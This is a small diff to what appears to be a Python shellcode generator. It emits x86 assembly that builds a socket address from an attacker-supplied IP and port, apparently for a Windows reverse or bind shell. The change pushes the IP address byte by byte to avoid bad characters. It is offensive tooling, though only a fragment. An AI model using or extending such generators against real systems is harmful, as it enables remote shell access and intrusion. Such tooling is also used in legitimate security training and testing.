@@ -1,6 +1,6 @@
 from coder import call_exit_func, find_and_call
 from coder.util import (
-    convert_ip_addr_hex,
+    convert_ip_addr_bytes,
     convert_port_hex,
     find_hash_key,
     push_hash,
@@ -9,7 +9,7 @@ from coder.util import (
 
 
 def generate(ip_addr, port, bad_chars, exit_func, debug=False):
-    ip_addr_hex = convert_ip_addr_hex(ip_addr)
+    ip_addr_bytes = convert_ip_addr_bytes(ip_addr)
     port_hex = convert_port_hex(port)
     hash_key = find_hash_key(
         [
@@ -68,7 +68,7 @@ def generate(ip_addr, port, bad_chars, exit_func, debug=False):
         xor   eax, eax                  // eax = 0
         push  eax                       // sin_zero[4:8] = NULL
         push  eax                       // sin_zero[0:4] = NULL
-        push  {ip_addr_hex}             // sin_addr = ip_addr
+        {push_string(ip_addr_bytes, bad_chars, end=b'')}
         mov   ax, {port_hex}            // eax = port
         shl   eax, 0x10                 // eax = (port << 0x10)
         add   ax, 0x02                  // eax = (port << 0x10) + 0x2
